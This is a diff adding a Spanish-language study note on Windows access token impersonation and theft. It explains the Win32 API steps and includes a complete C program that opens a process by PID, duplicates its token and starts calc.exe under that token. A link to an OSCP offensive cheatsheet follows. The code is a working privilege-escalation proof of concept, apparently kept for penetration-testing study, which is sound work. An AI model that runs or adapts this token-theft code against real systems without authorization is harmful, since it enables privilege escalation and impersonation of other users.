@@ -1,0 +1,65 @@
+****************** PASOS GENERALES ******************
+
+Claro, aquí te dejo las funciones de la API de Windows en C que se usarían para cada uno de los pasos en la técnica de Token Impersonation/Theft:
+
+ - Adjuntar o crear un proceso: Para adjuntar a un proceso existente, puedes usar la función OpenProcess. Para crear un nuevo proceso, puedes usar CreateProcess.
+
+ - Duplicar el token de acceso: Puedes usar la función DuplicateTokenEx para duplicar un token de acceso existente.
+
+- Impersonar el token duplicado: Para permitir que el hilo de llamada suplante el contexto de seguridad de un usuario registrado, puedes usar ImpersonateLoggedOnUser. Para asignar el token suplantado a un hilo, puedes usar SetThreadToken.
+
+- Ejecutar acciones bajo el nuevo contexto de seguridad: Una vez que el token está asignado a un hilo, cualquier acción que realice ese hilo se realizará bajo el contexto de seguridad del nuevo token. No hay una función específica para este paso, ya que simplemente implica ejecutar el código deseado en el hilo que ahora tiene el nuevo contexto de seguridad.
+
+
+
+
+****************** PASOS DEL CODIGO ******************
+
+Sí, el código que has proporcionado encaja con la técnica de Token Impersonation/Theft. Aquí está cómo se mapean los pasos de la técnica con las funciones en tu código:
+
+- Adjuntar o crear un proceso: OpenProcess se utiliza para obtener un handle al proceso que se va a suplantar.
+
+- Duplicar el token de acceso: OpenProcessToken se utiliza para obtener el token de acceso del proceso. Luego, DuplicateTokenEx se utiliza para duplicar el token de acceso.
+
+- Impersonar el token duplicado: CreateProcessWithTokenW se utiliza para crear un nuevo proceso con el token duplicado.
+
+- Ejecutar acciones bajo el nuevo contexto de seguridad: Cuando se crea el nuevo proceso con CreateProcessWithTokenW, el nuevo proceso se ejecuta con el contexto de seguridad del token duplicado.
+
+
+****************** CODIGO ******************
+FUNCIONA PERO ES OBLIGATORIO EJECUTAR EL POWERSHELL COMO ADMIN ->
+Permisos insuficientes: La función CreateProcessWithTokenW requiere ciertos permisos para funcionar correctamente. Según la documentación de Microsoft, los permisos necesarios son TOKEN_ASSIGN_PRIMARY, TOKEN_DUPLICATE, TOKEN_QUERY, TOKEN_ADJUST_DEFAULT y TOKEN_ADJUST_SESSIONID1. Si el token que estás utilizando no tiene estos permisos, la función fallará.
+
+#include <windows.h>
+#include <stdio.h>
+
+int main(int argc, char * argv[]) { 
+    char a; 
+    HANDLE processHandle; 
+    HANDLE tokenHandle = NULL; 
+    HANDLE duplicateTokenHandle = NULL; 
+    STARTUPINFOW startupInfo; 
+    PROCESS_INFORMATION processInformation; 
+    DWORD pid; 
+    wchar_t cmdline[] = L"C:\\Windows\\System32\\calc.exe"; 
+    ZeroMemory(&startupInfo, sizeof(STARTUPINFOW)); 
+    ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION)); 
+    startupInfo.cb = sizeof(STARTUPINFOW); 
+
+    // Get handle to the process in which we want to inject the dll
+    if (argc < 2) {
+        return EXIT_FAILURE;
+    }
+
+    pid = atoi(argv[1]);
+
+    processHandle = OpenProcess(PROCESS_ALL_ACCESS, TRUE, pid); 
+    OpenProcessToken(processHandle, TOKEN_ALL_ACCESS, &tokenHandle); 
+    DuplicateTokenEx(tokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle); 
+    CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, NULL, cmdline, 0, NULL, NULL, &startupInfo, &processInformation); 
+    return 0; 
+}
+
+
+
+https://github.com/blackc03r/OSCP-Cheatsheets/blob/master/offensive-security/privilege-escalation/t1134-access-token-manipulation.md
